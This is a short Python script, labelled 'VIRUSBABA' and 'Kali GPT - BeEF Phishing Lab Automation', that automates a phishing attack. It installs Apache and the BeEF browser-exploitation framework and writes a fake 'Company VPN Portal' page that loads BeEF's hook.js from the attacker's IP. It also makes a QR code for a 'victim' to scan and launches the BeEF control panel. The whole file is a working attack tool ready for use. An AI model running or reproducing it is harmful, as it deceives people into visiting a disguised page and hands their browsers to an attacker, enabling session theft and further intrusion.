print("\t\t\t\t\t\tVIRUSBABA")
import os
import socket
import qrcode
from pathlib import Path

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("10.255.255.255", 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = "127.0.0.1"
    finally:
        s.close()
    return IP

def setup_apache_and_phish(ip):
    index_path = "/var/www/html/index.html"
    os.system("sudo apt update && sudo apt install apache2 beef-xss -y")
    os.system("sudo systemctl start apache2")

    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Company VPN Portal</title>
    <script src="http://{ip}:3000/hook.js"></script>
</head>
<body>
    <h2>Important: Security Portal</h2>
    <p>Please wait while we verify your location and session...</p>
</body>
</html>
"""
    with open(index_path, "w") as f:
        f.write(html)
    print(f"[+] Phishing page written to {index_path}")

def generate_qr(ip):
    url = f"http://{ip}"
    qr = qrcode.make(url)
    qr_path = Path.home() / "beef_qr_code.png"
    qr.save(qr_path)
    print(f"[+] QR Code saved to: {qr_path}")
    print(f"[+] Victim can scan this QR to visit: {url}")

def start_beef():
    print("[*] Starting BeEF...")
    os.system("nohup beef-xss &")
    print("[+] Access BeEF panel at: http://127.0.0.1:3000/ui/panel")

def main():
    print("[*] Kali GPT - BeEF Phishing Lab Automation Starting...")
    ip = get_local_ip()
    print(f"[+] Local IP Address: {ip}")
    setup_apache_and_phish(ip)
    generate_qr(ip)
    start_beef()

if __name__ == "__main__":
    main()
